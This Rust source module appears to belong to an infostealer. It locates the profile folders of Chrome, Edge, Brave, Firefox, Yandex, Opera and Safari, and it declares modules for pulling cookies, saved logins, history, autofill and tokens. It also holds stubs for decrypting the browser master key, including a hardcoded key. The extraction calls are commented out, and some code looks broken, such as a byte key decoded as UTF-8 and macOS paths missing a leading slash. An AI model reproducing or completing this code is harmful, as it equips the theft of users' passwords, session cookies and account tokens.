mod autofill;
mod bookmarks;
mod cookies;
mod history;
mod logins;
mod token;

use std::path::PathBuf;

pub async fn get_browser() {
    let mut browser_root = get_browser_root_paths();

    let mut tempfile = if cfg!(target_os = "windows") {
        PathBuf::from(std::env::var("TEMP").unwrap())
    } else {
        PathBuf::from(String::from("/tmp"))
    };
    tempfile.push("cat.db");

    for path_entry in browser_root.iter_mut() {
        // let key = get_encrypted_key(path_entry.clone()).await;
        if let Ok(profiles) = get_profiles(path_entry).await {
            // let cookies = cookies::get_cookies(path_entry, &profiles, &tempfile, &key).await;
            // println!("{cookies:#?}");

            // let tokens = token::get_token(path_entry, &profiles).await;
            // println!("{tokens:#?}");

            // let logindata = logins::get_login_data(path_entry, &profiles, &tempfile, &key).await;
            // println!("{logindata:#?}");

            // let histories = history::get_history(path_entry, &profiles, &tempfile, &key).await;
            // println!("{histories:#?}");

            // let bookmarks = bookmarks::get_bookmarks(path_entry, &profiles).await;
            // println!("{bookmarks:#?}");

            // let autofills = autofill::get_autofill(path_entry, &profiles, &tempfile).await;
            // println!("{autofills:#?}");
        }
    }
}

fn get_browser_root_paths() -> Vec<PathBuf> {
    let mut root_paths = Vec::with_capacity(8);

    #[cfg(target_os = "windows")]
    {
        let local = std::env::var("LOCALAPPDATA").unwrap();
        let roaming = std::env::var("APPDATA").unwrap();

        root_paths.push(PathBuf::from(format!("{local}/Google/Chrome/User Data"))); // Google Chrome
        root_paths.push(PathBuf::from(format!("{local}/Microsoft/Edge/User Data"))); // Microsoft Edge
        root_paths.push(PathBuf::from(format!(
            "{local}/BraveSoftware/Brave-Browser/User Data"
        ))); // Brave Browser
             // browser_root.push(PathBuf::from(format!(""))), // Web Explorer
        root_paths.push(PathBuf::from(format!("{roaming}/Mozilla/Firefox/Profiles"))); // Firefox
        root_paths.push(PathBuf::from(format!(
            "{local}/Yandex/YandexBrowser/User Data"
        ))); // Yandex
        root_paths.push(PathBuf::from(format!(
            "{roaming}/Opera Software/Opera GX Stable"
        ))); // Opera GX Browser
        root_paths.push(PathBuf::from(format!(
            "{roaming}/Opera Software/Opera Stable"
        ))); // Opera Browser
    }
    #[cfg(target_os = "linux")]
    {
        let home = std::env::var("HOME").unwrap();

        // root_paths.push(PathBuf::from(format!("{home}/.mozilla/firefox"))); // Firefox
        root_paths.push(PathBuf::from(format!(
            "{home}/.config/BraveSoftware/Brave-Browser"
        )));
        // root_paths.push(PathBuf::from(format!("{home}/.config/google-chrome"))); // Google Chrome

        // root_paths.push(""); // Chromium
        // root_paths.push(""); // Microsoft Edge
        // root_paths.push(""); // Yandex
        // root_paths.push(""); // Opera
    }
    #[cfg(target_os = "macos")]
    {
        let user = std::env::var("USER").unwrap();

        root_paths.push(PathBuf::from(format!("Users/{user}/Library/Safari"))); // Safari
        root_paths.push(PathBuf::from(format!(
            "Users/{user}/Library/Application Support/Google/Chrome"
        ))); // Google Chrome
        root_paths.push(PathBuf::from(format!(
            "Users/{user}/Library/Application Support/Firefox/Profiles"
        ))); // Firefox
        root_paths.push(PathBuf::from(format!(
            "Users/{user}/Library/Application Support/com.operasoftware.Opera"
        ))); // Opera
    }

    root_paths
}

async fn get_encrypted_key(mut key_path: PathBuf) -> String {
    #[cfg(target_os = "windows")]
    {
        key_path.push("/Local State");

        if let Ok(encrypted_key) = tokio::fs::read_to_string(key_path).await {
            // deserialize master_key
        }
    }
    #[cfg(target_os = "linux")]
    {
        let key: Vec<u8> = vec![
            0x76, 0x31, 0x31, 0xB9, 0xBA, 0xC6, 0x4A, 0x63, 0x4A, 0xE5, 0x31, 0xD2, 0xBA, 0xF0,
            0x29, 0xCF, 0x8F, 0x49, 0xEC, 0xF8, 0x0A, 0xBA, 0x90, 0xC1, 0x27, 0xB7, 0xB6, 0xB0,
            0x2C, 0x50, 0xDA, 0x8C, 0xBA, 0x9B, 0x08, 0x4F, 0xFE, 0x7E, 0x7B, 0x93, 0xC5, 0xEA,
            0x5F, 0x87, 0x6A, 0x6A, 0x7C, 0x38, 0x49, 0x72, 0x58, 0x1C, 0x18, 0xF3, 0x22, 0xCA,
            0x16, 0x2B, 0xF7, 0xBD, 0x64, 0x18, 0x32, 0x30, 0xFB, 0x06, 0x92, 0x5C, 0x3C, 0x98,
            0x74, 0xBD, 0xD6, 0x81, 0x67, 0x45, 0x9B, 0x28, 0xCF, 0xEA, 0x8A, 0x16, 0xF2,
        ];
        return String::from_utf8(key).unwrap();
    }
    "".to_string()
}

async fn get_profiles(path: &mut PathBuf) -> std::io::Result<Vec<String>> {
    // checking if browser is installed or not
    match tokio::fs::read_dir(&path).await {
        Ok(mut list) => {
            let mut profiles = Vec::with_capacity(16);
            profiles.push("Default".to_string());
            // loop through all other profiles
            while let Ok(dir_entry_unknown) = list.next_entry().await {
                if let Some(dir_entry) = dir_entry_unknown {
                    if let Some(entry) = dir_entry.file_name().to_str() {
                        if !entry.starts_with("Profile") {
                            continue;
                        }
                    }
                    profiles.push(dir_entry.file_name().into_string().unwrap());
                } else {
                    break;
                }
            }
            return Ok(profiles);
        }
        Err(e) => return Err(e),
    }
}

async fn check_db_size(path: &mut PathBuf) -> std::io::Result<()> {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::fs::MetadataExt;
        if let Ok(f) = std::fs::metadata(path.as_os_str()) {
            if f.file_size() == 0 {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::Other,
                    "Database is empty",
                ));
            }
        }
    }
    #[cfg(target_os = "linux")]
    {
        use std::os::linux::fs::MetadataExt;
        if let Ok(f) = std::fs::metadata(path.as_os_str()) {
            if f.st_size() == 0 {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::Other,
                    "Database is empty",
                ));
            }
        }
    }
    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    {
        compile_error!("Unsupported target.");
    }
    Ok(())
}
